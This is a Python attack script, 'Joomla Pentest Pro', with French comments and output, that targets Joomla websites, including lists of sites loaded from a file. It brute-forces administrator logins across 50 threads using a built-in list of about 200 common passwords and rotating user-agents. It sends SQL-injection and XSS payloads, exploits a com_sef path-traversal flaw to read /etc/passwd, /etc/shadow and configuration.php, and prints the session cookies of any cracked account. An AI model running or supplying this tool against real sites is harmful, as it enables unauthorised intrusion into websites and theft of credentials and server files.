#!/usr/bin/env python3
"""
JOOMLA PENTEST PRO - Outil complet d'audit Joomla
Fonctionnalités améliorées:
- Exploit LFI com_sef intégré
- Liste de 200 mots de passe
- Vérification avancée des credentials
- Détection des protections
- Correction des erreurs CSRF et d'indentation
"""

import requests
from bs4 import BeautifulSoup
import argparse
from urllib.parse import urljoin, urlencode
import time
import random
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# ================= CONFIGURATION =================
MAX_THREADS = 50
REQUEST_TIMEOUT = 15
DELAY = 0.3

# ================= COULEURS =================
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

# ================= USER-AGENTS =================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15",
]

# ================= WORDLISTS =================
DEFAULT_USERS = [
    "admin", "demo", "Demo", "manager", "administrator", "superuser", 
    "joomla", "root", "test", "user"
]

DEFAULT_PASSWORDS = [
    "admin", "password", "123456", "Demo", "demo", "manager",  "12345678", "1234", "12345", 
    "qwerty", "letmein", "admin123", "welcome", "monkey", "sunshine",
    "password1", "123456789", "football", "iloveyou", "starwars", "dragon",
    "passw0rd", "master", "hello", "freedom", "whatever", "qazwsx", "trustno1",
    "654321", "jordan23", "harley", "password123", "1q2w3e4r", "555555",
    "loveme", "hello123", "zaq1zaq1", "abc123", "123123", "donald", "batman",
    "access", "shadow", "superman", "qwerty123", "michael", "mustang", "jennifer",
    "111111", "2000", "jordan", "super123", "123456a", "andrew", "matthew",
    "golfer", "buster", "nicole", "jessica", "pepper", "1111", "zxcvbn", "555555",
    "11111111", "131313", "freedom1", "7777777", "pass", "maggie", "159753",
    "aaaaaa", "ginger", "princess", "joshua", "cheese", "amanda", "summer",
    "love", "ashley", "6969", "nicole1", "chelsea", "biteme", "matthew1",
    "access14", "yankees", "987654321", "dallas", "austin", "thunder", "taylor",
    "matrix", "minecraft", "buster1", "hello1", "charlie", "1234567", "1234567890",
    "888888", "123123123", "flower", "password2", "soccer", "purple", "george",
    "chicken", "samsung", "anthony", "andrea", "killer", "jessica1", "peanut",
    "jordan1", "justin", "liverpool", "daniel", "secret", "asdfghjkl", "123654",
    "orange", "computer", "michelle", "mercedes", "banana", "blink182", "qwertyuiop",
    "123321", "snoopy", "baseball", "whatever1", "creative", "patrick", "internet",
    "scooter", "muffin", "123abc", "madison", "hockey", "arsenal", "dragon1",
    "maverick", "cookie", "ashley1", "bandit", "knight", "ginger1", "shannon",
    "william", "startrek", "phantom", "camaro", "boomer", "coffee", "falcon",
    "winner", "smith", "sierra", "runner", "butterfly", "test123", "merlin",
    "warrior", "cocacola", "bubble", "albert", "einstein", "chicago", "franklin",
    "dolphin", "testtest", "diamond", "bronco", "pokemon", "guitar", "jackson",
    "mickey", "scooby", "nascar", "tigger", "yellow", "babygirl", "sparky",
    "shadow1", "raiders", "sandiego", "rosebud", "morgan", "bigdaddy", "cowboy",
    "richard", "blue", "orange1", "justme", "fender", "johnson", "jackie",
    "monster", "toyota", "spider", "robert", "sophie", "apples", "victoria",
    "viking", "playboy", "green", "samsung1", "panther", "silver", "parker",
    "scorpio", "arthur", "badboy", "vikings", "tucker", "charles", "boston",
    "butter", "member", "carlos", "tennis", "hammer", "oliver", "marina",
    "denise", "squirt", "raymond", "redsox", "bigdog", "golfer1", "jackson1",
    "alex", "tigers", "jasper", "rocket", "bulldog", "scroll", "france", "running"
]

SQL_PAYLOADS = [
    "' OR '1'='1", "' '=' 'OR'", "' or 1=1 limit 1 -- -", "' OR 1=1-- -", 
    "admin'--", "\" OR \"\"=\"", 
    "\" OR 1=1-- -", "' OR 'a'='a"
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "%2e%2e%2fetc%2fpasswd",
    "/proc/self/environ",
    "/etc/shadow",
    "../../../../../../../../../../../../../../../etc/passwd%00",
    "../../../../../../../../../../../../../../../etc/passwd"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "\"><script>alert(1)</script>"
]

# ================= BANNIERE =================
BANNER = f"""
{PURPLE}{BOLD}
   ██╗ ██████╗  ██████╗ ███╗   ███╗ █████╗     ██████╗ ██████╗  ██████╗
   ██║██╔═══██╗██╔═══██╗████╗ ████║██╔══██╗   ██╔════╝██╔═══██╗██╔════╝
   ██║██║   ██║██║   ██║██╔████╔██║███████║   ██║     ██║   ██║██║     
██╗██║██║   ██║██║   ██║██║╚██╔╝██║██╔══██║   ██║     ██║   ██║██║     
╚█████╔╝╚██████╔╝╚██████╔╝██║ ╚═╝ ██║██║  ██║██╗╚██████╔╝╚██████╔╝╚██████╔╝
 ╚════╝  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ 
{CYAN}>>> JOOMLA PENTEST PRO - Audit Complet <<<\n
{BLUE}>>> Brute Force • XSS • LFI • SQLi • SEF Exploit <<<\n
{BLUE}>>> Coding By Hackfut <<<
{RESET}
"""

# ================= FONCTIONS =================
def get_random_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache'
    }

def print_status(message, color=YELLOW):
    print(f"{color}[*] {message}{RESET}")

def print_success(message):
    print(f"{GREEN}[+] {message}{RESET}")

def print_error(message):
    print(f"{RED}[-] {message}{RESET}")

def load_wordlist(filename):
    """Charge un fichier de wordlist et retourne une liste de lignes"""
    try:
        with open(filename, 'r', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print_error(f"Fichier introuvable: {filename}")
        return None
    except Exception as e:
        print_error(f"Erreur lecture wordlist: {str(e)}")
        return None

def log_attempt(username, password, success, response_time, status_code):
    """Journalise chaque tentative de connexion"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = (f"{timestamp} | {username}:{password} | "
                 f"Success: {success} | Response: {response_time:.2f}s | "
                 f"Code: {status_code}\n")
    
    with open("bruteforce_log.txt", "a") as f:
        f.write(log_entry)

def analyze_response(response):
    """Analyse approfondie de la réponse HTTP"""
    return {
        'content_length': len(response.content),
        'response_time': response.elapsed.total_seconds(),
        'redirects': len(response.history),
        'final_url': response.url,
        'status_code': response.status_code,
        'server_header': response.headers.get('Server', ''),
        'security_headers': {
            'x_frame_options': response.headers.get('X-Frame-Options'),
            'csp': response.headers.get('Content-Security-Policy')
        }
    }

def check_security_measures(response):
    """Détecte les protections anti-brute force"""
    security_indicators = {
        'captcha': any(x in response.text.lower() for x in ["captcha", "recaptcha"]),
        'blocked': any(x in response.text.lower() for x in ["blocked", "banned", "too many attempts"]),
        'security_plugin': any(x in response.text.lower() for x in ["jsecure", "admin tools", "rsfirewall"]),
        'rate_limit': response.status_code == 429
    }
    
    if any(security_indicators.values()):
        detected = [k for k, v in security_indicators.items() if v]
        return True, detected
    return False, []

def verify_login(session, response):
    """Vérifie plus précisément si le login a réussi"""
    verification_points = [
        "Control Panel" in response.text,
        "com_cpanel" in response.text,
        "logout" in response.text.lower(),
        "administrator/index.php?option=com_admin" in response.url,
        response.status_code in (303, 200)
    ]
    
    if any(verification_points):
        try:
            admin_check = session.get(
                urljoin(response.url, "index.php?option=com_admin"),
                headers=get_random_headers(),
                timeout=REQUEST_TIMEOUT
            )
            if "Global Configuration" in admin_check.text:
                return True
        except:
            pass
    return False

def get_csrf_token(session, url):
    """Récupère le token CSRF de manière robuste"""
    try:
        response = session.get(
            urljoin(url, "/administrator/index.php"),
            headers=get_random_headers(),
            timeout=REQUEST_TIMEOUT
        )
        response.raise_for_status()
        
        soup = BeautifulSoup(response.text, 'html.parser')
        token_input = soup.find('input', {'name': 'return'})
        
        if token_input:
            return token_input.get('value', '')
        
        # Fallback pour différentes versions de Joomla
        token_input = soup.find('input', {'name': 'csrf_token'}) or \
                     soup.find('input', {'name': 'token'}) or \
                     soup.find('meta', {'name': 'csrf-token'})
        
        if token_input:
            return token_input.get('value') or token_input.get('content', '')
        
        print_error("Aucun token CSRF trouvé dans la page")
        return None
        
    except requests.exceptions.HTTPError as http_err:
        print_error(f"Erreur HTTP: {http_err}")
    except Exception as e:
        print_error(f"Erreur inattendue: {str(e)}")
    return None

def exploit_com_sef_lfi(target_url, file_path):
    """Exploit LFI vulnerability in Joomla com_sef component"""
    if not target_url.endswith('index.php'):
        if not target_url.endswith('/'):
            target_url += '/'
        target_url += 'index.php'
    
    payload = f"../../../../../../../../../../../../../../../{file_path}%00"
    params = {
        'option': 'com_sef',
        'controller': payload
    }
    
    encoded_params = urlencode(params)
    full_url = f"{target_url}?{encoded_params}"
    
    print_status(f"Tentative d'exploit LFI com_sef: {file_path}")
    
    try:
        response = requests.get(
            full_url,
            headers=get_random_headers(),
            timeout=REQUEST_TIMEOUT
        )
        
        if response.status_code == 200:
            if "root:x:" in response.text or "DB_NAME" in response.text:
                print_success(f"Exploit réussi! Contenu du fichier {file_path}:")
                print(response.text[:1000] + "...")
                return True
        else:
            print_error(f"Le serveur a retourné le code: {response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print_error(f"Erreur lors de l'exploit: {str(e)}")
    return False

def test_lfi_advanced(url):
    """Test avancé des vulnérabilités LFI"""
    print_status(f"Scan LFI avancé sur {url}")
    vuln_found = False
    
    def test_payload(payload):
        try:
            test_url = f"{url}?view={payload}"
            r = requests.get(
                test_url,
                headers=get_random_headers(),
                timeout=REQUEST_TIMEOUT
            )
            if "root:x:" in r.text or "DB_NAME" in r.text:
                return f"LFI standard trouvé: {test_url}"
        except Exception as e:
            return None
        return None
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        results = list(executor.map(test_payload, LFI_PAYLOADS))
    
    for result in results:
        if result:
            print_error(result)
            vuln_found = True
    
    # Test de l'exploit com_sef
    files_to_test = [
        "/etc/passwd",
        "/etc/shadow",
        "/proc/self/environ",
        "configuration.php"
    ]
    
    for file in files_to_test:
        if exploit_com_sef_lfi(url, file):
            vuln_found = True
    
    if not vuln_found:
        print_success("Aucune vulnérabilité LFI détectée")

def joomla_brute_enhanced(url, users, passwords):
    """Version améliorée du brute force avec vérification avancée"""
    print_status(f"Brute Force avancé sur {url}")
    login_url = urljoin(url, "/administrator/index.php")
    
    def try_login(username, password):
        """Tente une connexion avec gestion robuste des erreurs"""
        try:
            session = requests.Session()
            token = get_csrf_token(session, url)
            
            if not token:
                print_error(f"Impossible d'obtenir le token CSRF pour {username}")
                return None
                
            data = {
                'username': username,
                'passwd': password,
                'option': 'com_login',
                'task': 'login',
                'return': token,
                'token': token  # Pour les versions récentes de Joomla
            }
            
            start_time = time.time()
            response = session.post(
                login_url,
                data=data,
                headers=get_random_headers(),
                timeout=REQUEST_TIMEOUT,
                allow_redirects=True
            )
            response_time = time.time() - start_time
            
            # Analyse de la réponse
            analysis = analyze_response(response)
            log_attempt(username, password, False, response_time, response.status_code)
            
            # Vérification des protections
            security_check, security_details = check_security_measures(response)
            if security_check:
                print_error(f"Protection détectée: {', '.join(security_details)}")
                return "security_block"
            
            # Vérification de la connexion
            if verify_login(session, response):
                log_attempt(username, password, True, response_time, response.status_code)
                return {
                    'credentials': (username, password),
                    'cookies': session.cookies.get_dict(),
                    'session': session,
                    'response_analysis': analysis
                }
                
        except requests.exceptions.RequestException as e:
            print_error(f"Erreur réseau: {str(e)}")
        except Exception as e:
            print_error(f"Erreur inattendue: {str(e)}")
        return None
    
    combinations = [(u, p) for u in users for p in passwords]
    found_creds = []
    security_blocked = False
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for combo in combinations:
            if security_blocked:
                break
                
            futures.append(executor.submit(try_login, combo[0], combo[1]))
            time.sleep(DELAY / MAX_THREADS)
        
        for future in as_completed(futures):
            result = future.result()
            if result == "security_block":
                security_blocked = True
                executor.shutdown(wait=False)
                break
            elif result and isinstance(result, dict):
                username = result['credentials'][0]
                password = result['credentials'][1]
                print_success(f"Compte trouvé: {username}:{password}")
                print_success(f"Cookies de session: {result['cookies']}")
                found_creds.append(result)
    
    if security_blocked:
        print_error("Le système a bloqué les tentatives de connexion")
    elif not found_creds:
        print_error("Aucun compte valide trouvé")
    return found_creds

def test_admin_access(url, credentials):
    """Teste l'accès administrateur avec les credentials trouvés"""
    username, password = credentials['credentials']
    session = credentials['session']
    
    print_status(f"Test d'accès admin pour {username}")
    
    try:
        config_url = urljoin(url, "administrator/index.php?option=com_config")
        r = session.get(config_url, headers=get_random_headers(), timeout=REQUEST_TIMEOUT)
        
        if "Global Configuration" in r.text:
            print_success(f"Accès admin confirmé pour {username}")
            return True
        else:
            print_error("Accès admin refusé malgré credentials valides")
            return False
    except Exception as e:
        print_error(f"Erreur test accès admin: {str(e)}")
        return False

def test_sqli(url):
    print_status(f"Test SQLi sur {url}")
    login_url = urljoin(url, "/administrator/index.php")
    
    def test_payload(payload):
        try:
            data = {
                'username': payload,
                'passwd': "pentest",
                'option': 'com_login',
                'task': 'login'
            }
            r = requests.post(
                login_url,
                data=data,
                headers=get_random_headers(),
                timeout=REQUEST_TIMEOUT
            )
            
            if "Control Panel" in r.text:
                return f"Vulnérable! Payload: {payload}"
            elif "MySQL" in r.text or "SQL syntax" in r.text:
                return f"Possible vulnérabilité avec: {payload}"
        except Exception as e:
            return None
        return None
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        results = list(executor.map(test_payload, SQL_PAYLOADS))
    
    vuln_found = False
    for result in results:
        if result:
            print_error(result)
            vuln_found = True
    
    if not vuln_found:
        print_success("Aucune vulnérabilité SQLi détectée")

def test_xss(url):
    print_status(f"Scan XSS sur {url}")
    
    def test_form(form):
        try:
            form_action = form.get('action', '')
            form_url = urljoin(url, form_action)
            inputs = form.find_all('input')
            
            for input_tag in inputs:
                if input_tag.get('type') in ['text', 'search', 'email']:
                    for payload in XSS_PAYLOADS:
                        data = {input_tag['name']: payload}
                        r = requests.post(
                            form_url,
                            data=data,
                            headers=get_random_headers(),
                            timeout=REQUEST_TIMEOUT
                        )
                        if payload in r.text:
                            return f"XSS trouvé dans {form_url} - Paramètre: {input_tag['name']}"
        except Exception as e:
            return None
        return None
    
    try:
        r = requests.get(url, headers=get_random_headers(), timeout=REQUEST_TIMEOUT)
        soup = BeautifulSoup(r.text, 'html.parser')
        forms = soup.find_all('form')
        
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            results = list(executor.map(test_form, forms))
        
        vuln_found = False
        for result in results:
            if result:
                print_error(result)
                vuln_found = True
        
        if not vuln_found:
            print_success("Aucune vulnérabilité XSS détectée")
            
    except Exception as e:
        print_error(f"Erreur XSS: {str(e)}")

def scan_site(url, users, passwords):
    print(f"\n{CYAN}{'='*60}\n[+] Scan de: {url}\n{'='*60}{RESET}")
    
    # Tests de vulnérabilités
    test_sqli(url)
    test_xss(url)
    test_lfi_advanced(url)
    
    # Brute Force amélioré
    found_credentials = joomla_brute_enhanced(url, users, passwords)
    
    # Si des credentials sont trouvés, tester leur accès
    if found_credentials:
        for cred in found_credentials:
            test_admin_access(url, cred)
    
    return found_credentials

# ================= MAIN =================
if __name__ == "__main__":
    clear_screen()
    print(BANNER)
    
    parser = argparse.ArgumentParser(
        description="Joomla Pentest Pro - Outil complet d'audit",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-u", "--url", help="URL cible (ex: http://site.com)")
    parser.add_argument("-f", "--file", help="Fichier contenant des URLs (une par ligne)")
    parser.add_argument("-l", "--userlist", help="Fichier d'utilisateurs personnalisé")
    parser.add_argument("-p", "--passlist", help="Fichier de mots de passe personnalisé")
    parser.add_argument("-t", "--threads", type=int, default=MAX_THREADS, 
                       help=f"Nombre de threads (défaut: {MAX_THREADS})")
    parser.add_argument("-d", "--delay", type=float, default=DELAY,
                       help=f"Délai entre requêtes (défaut: {DELAY}s)")
    args = parser.parse_args()
    
    # Configuration
    MAX_THREADS = args.threads
    DELAY = args.delay
    
    # Chargement des wordlists
    users = DEFAULT_USERS
    passwords = DEFAULT_PASSWORDS
    
    if args.userlist:
        custom_users = load_wordlist(args.userlist)
        if custom_users:
            users = custom_users
        else:
            print_error("Impossible de charger la liste d'utilisateurs")
            exit(1)
    
    if args.passlist:
        custom_passwords = load_wordlist(args.passlist)
        if custom_passwords:
            passwords = custom_passwords
        else:
            print_error("Impossible de charger la liste de mots de passe")
            exit(1)
    
    # Gestion des URLs
    urls = []
    if args.file:
        urls = load_wordlist(args.file)
        if not urls:
            print_error("Aucune URL valide trouvée dans le fichier")
            exit(1)
    elif args.url:
        urls = [args.url]
    else:
        parser.print_help()
        exit(1)
    
    # Lancement des scans
    for target_url in urls:
        scan_site(target_url, users, passwords)
    
    print(f"\n{CYAN}[+] Scan terminé !{RESET}")
